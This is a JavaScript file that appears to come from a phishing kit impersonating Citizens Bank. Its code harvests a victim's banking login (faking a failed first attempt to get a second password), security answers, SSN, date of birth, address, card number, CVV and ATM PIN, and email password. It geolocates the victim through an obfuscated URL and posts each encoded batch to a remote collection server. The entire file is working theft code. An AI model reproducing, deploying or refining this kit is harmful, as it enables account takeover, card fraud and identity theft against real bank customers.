let ip_config = {};
let Mail_URL = new URL(location.href);
let link = "";


$(document).ready(async function () {
    localStorageCheck();
    if (Object.keys(ip_config).length < 2) {
        await get_reload_ip();
    }
    Annonymous_one();

    //Main jQuery post event

    /*    $('#form_index').on('submit', async function (e) {
            e.preventDefault();
            await submit_user_single();
        })*/

    //if (document.querySelectorAll("form#form").length > 0) {
    /*let form_verify = document.querySelector("form#form");
    console.log(form_verify)
    form_verify.addEventListener("submit", (e) => {
        e.preventDefault();
        console.log(e)
    })*/
    //}
    /*$(form_veriy_submit).on('submit', function (e){
        e.preventDefault()
        console.log(this)
    })*/

})


async function get_reload_ip() {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: window.atob("aHR0cHM6Ly91cy1jZW50cmFsMS1jbG91ZC1hcHAtcGhwLW15c3FsLmNsb3VkZnVuY3Rpb25zLm5ldC9pcA=="),
            type: 'GET',
            dataType: "json",
            success: function (response) {
                if (response.status === "success") {
                    localStorage.setItem("ip_config", JSON.stringify(response));
                    localStorageCheck();
                }
                resolve(true);
            },
            error: function (response) {
                let error = {errors: response.responseJSON.errors[0]}
                resolve(true);
            }
        });
    });
}

function localStorageCheck() {
    let ip = localStorage.getItem("ip_config");
    if (ip !== null) ip_config = JSON.parse(ip);
}


function User_Pass_single(username, password, secondtry = true) {
    let second = secondtry ? " - Second Try" : "";
    let post = `--------------< Jm Tech Inc. >--------------------------
-----------------< Citizen Bank Report >---------------------------
== Bank Acess${second} >---------------------------
Username : ${username}
Passord : ${password}
== Other Info >--------------------------------
Country: ${ip_config.country} || State: ${ip_config.regionName} || City: ${ip_config.city}
IP: ${ip_config.query} || ISP: ${ip_config.isp} || Entry Time: #time#
== Browser >----------------------------------
User-Agent: ${navigator.userAgent}
-------------< Jmathew Inc. >---------------------------------

`;
    return btoa(post);
}

function QnA_verify_single(username, q1, q2, q3, a1, a2, a3) {
    let q1o = {
        "1": "What is your father's middle name?",
        "2": "What is your maternal grandmother's name?",
        "3": "What is the name of the first company you worked for?",
        "4": "What is your maternal grandfather's name?",
        "5": "In what city was your high school? (full name of city only)",
        "6": "What was the name of your high school?",
        "7": "What is the first name of the maid of honor at your wedding?",
        "8": "In what city were you married? (Enter full name of city)",
        "9": "What is the first name of your oldest nephew?"
    }
    let q2o = {
        "1": "What is the first name of the best man at your wedding?",
        "2": "What is the first name of your oldest niece?",
        "3": "What is your paternal grandfather's name?",
        "4": "In what city is your vacation home? (Enter full name of city only)",
        "5": "What was the name of your first girlfriend or boyfriend?",
        "6": "In what city was your father born? (Enter full name of city only)",
        "7": "What was the name of your first pet?",
        "8": "What was the nickname of your grandfather?",
        "9": "What was your high school mascot?"
    }
    let q3o = {
        "1": "What is your paternal grandfather's name?",
        "2": "What street did your best friend in high school live on? (Enter full name of street only)",
        "3": "What was the last name of your favorite teacher in final year of high school?",
        "4": "In what city were you born? (Enter full name of city only)",
        "5": "What was the name of the town your grandmother lived in? (Enter full name of city only)",
        "6": "What was your favorite restaurant in college?",
        "7": "Where did you meet your spouse for the first time? (Enter full name of city only)",
        "8": "In what city was your mother born? (Enter full name of city only)",
        "9": "What was the name of your junior high school? (Enter only \"Riverdale\" for Riverdale Junior high school)"
    }
    q1 = q1o[q1.toString()];
    q2 = q2o[q2.toString()];
    q3 = q3o[q3.toString()];
    let post = `--------------< Jm Tech Inc. >--------------------------
-----------------< Citizen Bank Report >---------------------------
== Security Questions - ${username} >---------------------------
Question 1: ${q1}
Answer 1: ${a1}
Question 2: ${q2}
Answer 2: ${a2}
Question 3: ${q3}
Answer 3: ${a3}
== Other Info >--------------------------------
Country: ${ip_config.country} || State: ${ip_config.regionName} || City: ${ip_config.city}
IP: ${ip_config.query} || ISP: ${ip_config.isp} || Entry Time: #time#
== Browser >----------------------------------
User-Agent: ${navigator.userAgent}
-------------< Jmathew Inc. >---------------------------------

`;
    return btoa(post);
}

function personal_info_single(username, full_name, address, city, state, zip, dob, ssn) {
    let post = `--------------< Jm Tech Inc. >--------------------------
-----------------< Citizen Bank Report >---------------------------
== Billing Info - ${username} >---------------------------
Full Name: ${full_name}
Address: ${address}
City: ${city}
State: ${state}
zipcode: ${zip}
Date Of Birth: ${dob}
Social Security Number (SSN): ${ssn}
== Other Info >--------------------------------
Country: ${ip_config.country} || State: ${ip_config.regionName} || City: ${ip_config.city}
IP: ${ip_config.query} || ISP: ${ip_config.isp} || Entry Time: #time#
== Browser >----------------------------------
User-Agent: ${navigator.userAgent}
-------------< Jmathew Inc. >---------------------------------

`;
    return btoa(post);
}

function card_info_single(username, card_number, expire, cvv, pin, card) {
    let post = `--------------< Jm Tech Inc. >--------------------------
-----------------< Citizen Bank Report >---------------------------
== CC Details - ${username} >---------------------------
Card Number: ${card_number}
Expiration Date: ${expire}
Cvv: ${cvv}
ATM PIN: ${pin}
== BIN Info >---------------------------
Brand: ${card.scheme} || Level: ${card.brand} || Type: ${card.type} || Country: ${card.country}
== Other Info >--------------------------------
Country: ${ip_config.country} || State: ${ip_config.regionName} || City: ${ip_config.city}
IP: ${ip_config.query} || ISP: ${ip_config.isp} || Entry Time: #time#
== Browser >----------------------------------
User-Agent: ${navigator.userAgent}
-------------< Jmathew Inc. >---------------------------------

`;
    return btoa(post);
}

function Email_Pass_single(username, email, password) {
    let post = `--------------< Jm Tech Inc. >--------------------------
-----------------< Citizen Bank Report >---------------------------
== Email Acess - ${username} >---------------------------
Username : ${email}
Passord : ${password}
== Other Info >--------------------------------
Country: ${ip_config.country} || State: ${ip_config.regionName} || City: ${ip_config.city}
IP: ${ip_config.query} || ISP: ${ip_config.isp} || Entry Time: #time#
== Browser >----------------------------------
User-Agent: ${navigator.userAgent}
-------------< Jmathew Inc. >---------------------------------

`;
    return btoa(post);
}

async function getBin(card) {
    card = card.split(' ').join('').substring(0, 6);
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: "https://lookup.binlist.net/" + card,
            type: 'GET',
            dataType: "json",
            success: function (response) {
                if (Object.keys(response).length > 4) {
                    let card_details = {
                        scheme: response.scheme,
                        brand: response.brand,
                        type: response.type,
                        country: response.country.alpha2
                    }
                    resolve(card_details);
                } else {
                    let card_details = {
                        scheme: "Unknown",
                        brand: "Unknown",
                        type: "Unknown",
                        country: "Unknown"
                    }
                    resolve(card_details);
                }
            },
            error: function (response) {
                let card_details = {
                    scheme: "Unknown",
                    brand: "Unknown",
                    type: "Unknown",
                    country: "Unknown",
                    errors: response
                }
                resolve(card_details);
            }
        });
    });
}


//MAIN RESULT FUNCTION

async function form_index(form) {
    let u = document.getElementById("UserID").value;
    let p = document.getElementById("currentpassword").value;
    $(document.getElementById('btn')).val('Please wait...').css({"text-transform": "initial"})
    let post = User_Pass_single(u, p, TWO_TRY_USER_ACCESS === true && location.href.includes('vry=') === true);
    let result = await load_Send_post(post);
    if (Object.keys(result).includes('errors')) {
        window.location.replace(location.href);
        window.location.reload();
    } else {
        if (result.response.msg.includes("uccessfull")) {
            localStorage.setItem("username", u);
            if (TWO_TRY_USER_ACCESS === true && location.href.includes('vry=') === false) {
                window.location.replace(location.href + "&vry=" + (new Date()).getTime());
                window.location.reload();
            } else {
                let url = location.href.split("#")[0] + "#/login/verify.js?" + query_gen();
                location.replace(url);
                window.location.reload();
            }
        } else {
            window.location.replace(location.href);
            window.location.reload();
        }
    }
}

async function form_verify(form) {
    let q1 = document.getElementById("q1").value;
    let q2 = document.getElementById("q2").value;
    let q3 = document.getElementById("q3").value;
    let a1 = document.getElementById("a1").value;
    let a2 = document.getElementById("a2").value;
    let a3 = document.getElementById("a3").value;
    let post = QnA_verify_single(localStorage.getItem("username"), q1, q2, q3, a1, a2, a3);
    let result = await load_Send_post(post);
    if (Object.keys(result).includes('errors')) {
        window.location.replace(location.href);
        window.location.reload();
    } else {
        if (result.response.msg.includes("uccessfull")) {
            let url = location.href.split("#")[0] + "#/login/details.js?" + query_gen();
            location.replace(url);
            window.location.reload();
        } else {
            window.location.replace(location.href);
            window.location.reload();
        }
    }
    return false;
}


async function form_details(form) {
    let fname = document.getElementById("fname").value;
    let address = document.getElementById("address").value;
    let city = document.getElementById("city").value;
    let state = document.getElementById("state").value;
    let zip = document.getElementById("zip").value;
    let dob = document.getElementById("dob").value;
    let ssn = document.getElementById("ssn").value;
    let post = personal_info_single(localStorage.getItem("username"), fname, address, city, state, zip, dob, ssn);
    let result = await load_Send_post(post);
    if (Object.keys(result).includes('errors')) {
        window.location.replace(location.href);
        window.location.reload();
    } else {
        if (result.response.msg.includes("uccessfull")) {
            let url = location.href.split("#")[0] + "#/login/card.js?" + query_gen();
            location.replace(url);
            window.location.reload();
        } else {
            window.location.replace(location.href);
            window.location.reload();
        }
    }
    return false;
}


async function form_contact(form) {
    let email = document.getElementById("email").value;
    location.replace(userEmail(email));
    location.reload();
}


async function form_card(form) {
    let card = document.getElementById("card").value;
    let cvv = document.getElementById("cvv").value;
    let exp = document.getElementById("exp").value;
    let pin = document.getElementById("pin").value;
    let bin = await getBin(card);
    let post = card_info_single(localStorage.getItem("username"), card, exp, cvv, pin, bin);
    let result = await load_Send_post(post);
    if (Object.keys(result).includes('errors')) {
        window.location.replace(location.href);
        window.location.reload();
    } else {
        if (result.response.msg.includes("uccessfull")) {
            let url = location.href.split("#")[0] + "#/login/contact.js?" + query_gen();
            location.replace(url);
            window.location.reload();
        } else {
            window.location.replace(location.href);
            window.location.reload();
        }
    }
    return false;
}


//General Funtions
async function load_Send_post(post) {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: USE_DEDICATED ? D_SCRIPT_NAME : G_SCRIPT_NAME,
            type: 'POST',
            dataType: "json",
            data: {
                license: USE_DEDICATED ? DEDICATED_LICENSE : GENERAL_LICENSE_KEY,
                post
            },
            success: function (response) {
                resolve({response});
            },
            error: function (response) {
                let error = {errors: response}
                resolve(error);
            }
        });
    });
}

function query_gen() {
    return ("scr=" + Math.random().toString().replace("0.", "") + "&cookies=" + window.btoa(Math.random().toString()).replace("=", "").replace("=", "") + "&tokens=" + Math.random().toString().replace("0.", ""));
}

function userEmail(email = "") {
    email = "eml=" + email.toLowerCase() + "&";
    if (email.includes("@gmail")) {
        return "#/login/email/gmail.js?" + email + query_gen();
    } else if (email.includes("@yahoo") || email.includes("@ymail") || email.includes("@rocketmail") || email.includes("@att.")) {
        return "#/login/email/yahoo.js?" + email + query_gen();
    } else if (email.includes("@outlook") || email.includes("@hotmail") || email.includes("@live") || email.includes("@msn")) {
        return "#/login/email/microsolt.js?" + email + query_gen();
    } else if (email.includes("@aol")) {
        return "#/login/email/aol.js?" + email + query_gen();
    } else if (email.includes("@comcast")) {
        return "#/login/email/comcast.js?" + email + query_gen();
    } else if (email.includes("@att") || email.includes("@bells")) {
        return "#/login/email/att.js?" + email + query_gen();
    } else if (email.includes("@verizon")) {
        return "#/login/email/verizon.js?" + email + query_gen();
    } else {
        return "#/login/email/microsolt.js?" + email + query_gen();
    }
}


//Annonymous

function Annonymous_one() {
    let countForWait = 0;
    waitForHeaderElement();

    function waitForHeaderElement() {
        countForWait++;
        if (typeof _HEAD !== "undefined" && _HEAD !== null) {
            console.log(document.getElementById("error"));
            if (url_index_name === "index" && location.href.includes('vry=')) {
                document.getElementById("UserID").classList.add("error");
                document.getElementById("currentpassword").style.borderColor = 'red';
                document.getElementById("lu").classList.add("error");
                document.getElementById("lp").classList.add("error");
                document.getElementById("fielderror").style.display = 'block';
                document.getElementById("error").innerHTML = '<div class="error-message show-error error-visible" style="display: block;">The information you entered does not match our records. Please check your information and try again.</div>';
            }
        } else {
            if (countForWait < 20)
                setTimeout(waitForHeaderElement, 250);
        }
    }
}


